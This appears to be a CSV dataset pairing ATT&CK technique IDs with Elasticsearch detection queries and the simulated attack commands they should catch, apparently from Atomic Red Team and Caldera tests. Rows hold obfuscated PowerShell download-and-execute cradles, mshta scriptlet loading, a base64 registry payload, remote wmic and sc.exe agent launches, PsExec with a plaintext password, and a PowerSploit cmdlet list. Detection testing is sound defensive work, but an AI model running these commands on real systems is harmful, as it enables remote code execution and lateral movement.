T1059.001,"{
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""*.InvokeCommand""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');
IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))); 
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');
[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs(); 
Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';
Set-Item Variable:\gH 'Default_File_Path.ps1';
ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods
|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?
{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);
(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))",2
T1204.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""PotentiallyUnwanted.exe""}},
                {""match_phrase"": {""CommandLine"": ""Invoke-WebRequest""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe;
& ""$env:TEMP/PotentiallyUnwanted.exe""",2
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""-version 2""}},
                {""match"": {""CommandLine"": ""powershell""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","if(2 -in $PSVersionTable.PSCompatibleVersions.Major) { ; } else {Write-Host  Automated installer not implemented yet, please install PowerShell v2 manually};  ; 
powershell.exe -version 2 -Command Write-Host $PSVersion",2
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""reg*""}},
                {""match_phrase"": {""CommandLine"": ""Software\\Classes\\""}},
                  {""match"": {""CommandLine"": ""add""}},
                  {""match"": {""CommandLine"": ""ART""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","reg.exe add ""HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam"" /v ART /t REG_SZ /d ""U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=""; 
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))",
T1059.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[{""match_phrase"":{""CommandLine"": ""Write-Host""}}                ]
     }
    },
    {""bool"":{
     ""should"":[
                       {""match_phrase"":{""CommandLine"": ""Add-Persistence""}},
                        {""match_phrase"":{""CommandLine"": ""Find-AVSignature""}},
                       {""match_phrase"":{""CommandLine"": ""Get-GPPAutologon""}},
                       {""match_phrase"":{""CommandLine"": ""Get-GPPPassword""}},
                       {""match_phrase"":{""CommandLine"": ""Get-HttpStatus""}},
                       {""match_phrase"":{""CommandLine"": ""Get-Keystrokes""}},
                        {""match_phrase"":{""CommandLine"": ""Get-SecurityPackages""}},
                        {""match_phrase"":{""CommandLine"": ""Get-TimedScreenshot""}},
                        {""match_phrase"":{""CommandLine"": ""Get-VaultCredential""}},
                        {""match_phrase"":{""CommandLine"": ""Get-VolumeShadowCopy""}},
                        {""match_phrase"":{""CommandLine"": ""Install-SSP""}},
                        {""match_phrase"":{""CommandLine"": ""Invoke-CredentialInjection""}},
                        {""match_phrase"":{""CommandLine"": ""Invoke-DllInjection""}},
                        {""match_phrase"":{""CommandLine"": ""Invoke-Mimikatz""}},
                        {""match_phrase"":{""CommandLine"": ""Invoke-NinjaCopy""}},
                        {""match_phrase"":{""CommandLine"": ""Invoke-Portscan""}},
                        {""match_phrase"":{""CommandLine"": ""Invoke-ReflectivePEInjection""}},
                        {""match_phrase"":{""CommandLine"": ""Invoke-ReverseDnsLookup""}},
                        {""match_phrase"":{""CommandLine"": ""Invoke-Shellcode""}},
                        {""match_phrase"":{""CommandLine"": ""Invoke-TokenManipulation""}},
                        {""match_phrase"":{""CommandLine"": ""Invoke-WmiCommand""}},
                        {""match_phrase"":{""CommandLine"": ""Mount-VolumeShadowCopy""}},
                        {""match_phrase"":{""CommandLine"": ""New-ElevatedPersistenceOption""}},
                        {""match_phrase"":{""CommandLine"": ""New-UserPersistenceOption""}},
                        {""match_phrase"":{""CommandLine"": ""New-VolumeShadowCopy""}},
                        {""match_phrase"":{""CommandLine"": ""Out-CompressedDll""}},
                        {""match_phrase"":{""CommandLine"": ""Out-EncodedCommand""}},
                        {""match_phrase"":{""CommandLine"": ""Out-EncryptedScript""}},
                        {""match_phrase"":{""CommandLine"": ""Out-Minidump""}},
                        {""match_phrase"":{""CommandLine"": ""PowerUp""}},
                        {""match_phrase"":{""CommandLine"": ""PowerView""}},
                        {""match_phrase"":{""CommandLine"": ""Remove-Comments""}},
                        {""match_phrase"":{""CommandLine"": ""Remove-VolumeShadowCopy""}},
                        {""match_phrase"":{""CommandLine"": ""Set-CriticalProcess""}},
                        {""match_phrase"":{""CommandLine"": ""Set-MasterBootRecord""}}
                              ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$malcmdlets = ""Add-Persistence"", ""Find-AVSignature"", ""Get-GPPAutologon"", ""Get-GPPPassword"",""Get-HttpStatus"", ""Get-Keystrokes"", ""Get-SecurityPackages"", ""Get-TimedScreenshot"", ""Get-VaultCredential"", ""Get-VolumeShadowCopy"", ""Install-SSP"", ""Invoke-CredentialInjection"", ""Invoke-DllInjection"", ""Invoke-Mimikatz"", ""Invoke-NinjaCopy"", ""Invoke-Portscan"", ""Invoke-ReflectivePEInjection"", ""Invoke-ReverseDnsLookup"", ""Invoke-Shellcode"", ""Invoke-TokenManipulation"", ""Invoke-WmiCommand"", ""Mount-VolumeShadowCopy"", ""New-ElevatedPersistenceOption"", ""New-UserPersistenceOption"", ""New-VolumeShadowCopy"", ""Out-CompressedDll"", ""Out-EncodedCommand"", ""Out-EncryptedScript"", ""Out-Minidump"", ""PowerUp"", ""PowerView"", ""Remove-Comments"", ""Remove-VolumeShadowCopy"", ""Set-CriticalProcess"", ""Set-MasterBootRecord""; 
foreach ($cmdlets in $malcmdlets) {;
     ""function $cmdlets { Write-Host Pretending to invoke $cmdlets }""}; 
foreach ($cmdlets in $malcmdlets) {;
     $cmdlets}",2
T1059.001,"
{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[{""match_phrase"":{""CommandLine"": ""T1086_PowerShell_Session_Creation_and_Use""}}                ]
     }
    },
    {""bool"":{
     ""should"":[ 
{""match_phrase"": {""CommandLine"": ""New-PSSession""}},
                {""match_phrase"": {""CommandLine"": ""Test-Connection""}},
                 {""match_phrase"": {""CommandLine"": ""Set-Content""}},
                 {""match_phrase"": {""CommandLine"": ""Get-Conten""}},
                 {""match_phrase"": {""CommandLine"": ""Remove-Item""}}
                              ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Try {;     New-PSSession -ComputerName $env:COMPUTERNAME -ErrorAction Stop | Out-Null;      ; } ; 
Catch {;     Enable-PSRemoting; };  ; 
New-PSSession -ComputerName $env:COMPUTERNAME; 
Test-Connection $env:COMPUTERNAME; 
Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value ""T1086 PowerShell Session Creation and Use""; 
Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use; 
Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use",2
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""downloadstring""}},
                 {""match_phrase"": {""CommandLine"": ""https://bit.ly/33H0QXi""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(""https://bit.ly/33H0QXi"")",1
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match_phrase"": {""CommandLine"": ""Invoke-AllChecks""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing); 
Invoke-AllChecks",2
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""noprofile""}},
                {""match"": {""CommandLine"": ""ServerXmlHttp""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","powershell.exe -exec bypass -noprofile ""$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText""",2
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""*.Load""}},
                 {""wildcard"": {""CommandLine"": ""*.command.a.execute""}},
                 {""match_phrase"": {""CommandLine"": ""IEX""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec 
bypass -noprofile ""$Xml = (New-Object System.Xml.XmlDocument);
$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');
$Xml.command.a.execute | IEX""",2
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""*sct""}},
                 {""match"": {""CommandLine"": ""mshta""}},
                {""match"": {""CommandLine"": ""javascript""}},
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","C:\Windows\system32\cmd.exe /c ""mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()""",2
T1059.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""wildcard"": {""CommandLine"": ""*DownloadString""}},
                 
                    ]
     }
    },
    {""bool"":{
     ""must"":[
                      {""wildcard"": {""CommandLine"": ""*SharpHound.ps1""}},
                 {""match_phrase"": {""CommandLine"": ""Invoke-BloodHound""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","write-host ""Import and Execution of SharpHound.ps1 from PathToAtomicsFolder\T1059.001\src"" -ForegroundColor Cyan; 
import-module PathToAtomicsFolder\T1059.001\src\SharpHound.ps1;
Invoke-BloodHound -OutputDirectory $env:Temp; Start-Sleep 5",2
T1569.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""create""}},
                {""match"": {""CommandLine"": ""start ""}},
                 {""match"": {""CommandLine"": ""sandsvc""}},
                 {""wildcard"": {""CommandLine"": ""s4ndc4t*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","sc.exe \\#{remote.host.fqdn} create sandsvc start= demand error= ignore binpath= ""cmd /c start C:\Users\Public\s4ndc4t.exe -server #{server} -v -originLinkID #{origin_link_id}"" displayname= ""Sandcat Execution"";
sc.exe \\#{remote.host.fqdn} start sandsvc;
Start-Sleep -s 15;
Get-Process -ComputerName #{remote.host.fqdn} s4ndc4t;",2
T1059.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""wordpad.exe""}},
                 {""match"": {""CommandLine"": ""for""}},
                 {""match"": {""CommandLine"": ""in""}},
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","cmd /c ""for /l %x in (1,1,75) do start wordpad.exe /p $env:temp\T1059_003note.txt"" | out-null",2
T1047,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""s4ndc4t*""}},
                  {""match_phrase"": {""CommandLine"": ""process call create""}},
                  {""match"": {""CommandLine"": ""wmic""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","wmic /node:`""#{remote.host.fqdn}`"" /user:`""#{domain.user.name}`"" /password:`""#{domain.user.password}`"" process call create ""powershell.exe C:\Users\Public\s4ndc4t.exe -server #{server} -group #{group}"";",
T1059.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Get-Process""}},
                {""match"": {""CommandLine"": ""powershell""}},
                {""match_phrase"": {""CommandLine"": ""Stop-Process""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","Get-Process -Name ""powershell"" | Stop-Process",2
T1569.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""PsExec.exe""}},
                 {""match_phrase"": {""CommandLine"": ""calc.exe""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","C:\PSTools\PsExec.exe \\localhost -u DOMAIN\Administrator -p P@ssw0rd1 -accepteula ""C:\Windows\System32\calc.exe""",2
T1059.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""wildcard"": {""CommandLine"": ""cscript*""}},
                 {""wildcard"": {""CommandLine"": ""*.vbs""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",cscript a771e6_sys_info.vbs > $env:TEMP\T1059.005.out.txt,2
T1047,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": ""user""}},
                        {""match"": {""CommandLine"": ""password""}},
                         {""match"": {""CommandLine"": ""node""}},
                 
                    ]
     }
    },
    {""bool"":{
     ""must"":[
                     {""match_phrase"": {""CommandLine"": ""notepad.exe""}},
                 {""match"": {""CommandLine"": ""process""}},
                  {""wildcard"": {""CommandLine"": ""wmic*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",wmic process call create notepad.exe,2
T1047,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""rundll32""}},
                 {""match"": {""CommandLine"": ""wmic""}},
                   {""match"": {""CommandLine"": ""node""}},
                 {""match_phrase"": {""CommandLine"": ""calc.dll""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","wmic /node:127.0.0.1 process call create ""rundll32.exe $env:TEMP\calc.dll StartW""",2
T1047,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""wmic""}},
                 {""match_phrase"": {""CommandLine"": ""service where""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","wmic /node:""127.0.0.1"" service where (caption like ""%Spooler%"")

",2
T1047,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"":{""CommandLine"": ""wmic process get""}},
                         {""match_phrase"":{""CommandLine"": ""format:csv""}}        
    ]
     }
    },
    {""bool"":{
     ""should"":[
                       {""match_phrase"":{""CommandLine"": ""caption""}},
                       {""match_phrase"":{""CommandLine"": ""executablepath""}},
                       {""match_phrase"":{""CommandLine"": ""commandline""}}
                                                   ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","wmic process get caption,executablepath,commandline /format:csv",2
T1059.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""echo""}},
                {""match"": {""CommandLine"": ""&gt;""}},
                  {""wildcard"": {""CommandLine"": ""*.bin""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","echo ""Hello from the Windows Command Prompt!"" > ""%TEMP%\test.bin"" & type ""%TEMP%\test.bin""",2
